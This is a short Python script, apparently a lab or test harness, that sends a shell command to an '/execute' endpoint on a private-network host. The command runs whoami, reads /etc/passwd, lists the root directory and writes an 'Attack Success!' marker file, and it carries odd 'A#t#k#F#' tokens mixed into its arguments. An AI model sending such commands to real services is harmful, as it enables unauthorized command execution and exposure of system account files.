import time

import requests
from loguru import logger
from rich import print

try:
    time.sleep(3)
    res = requests.post(
        "http://192.168.123.4:5000/execute",
        json={
            "command": "whoami && cat A#t#k#F#2#/etc/passwd && ls -al A#t#k#F#1# / && echo 'A#t#k#F#3#Attack Success!' > /tmp/attack_success.txt",
        },
    )
    print(res.content.decode())
    time.sleep(3)
except Exception as e:
    logger.exception(e)
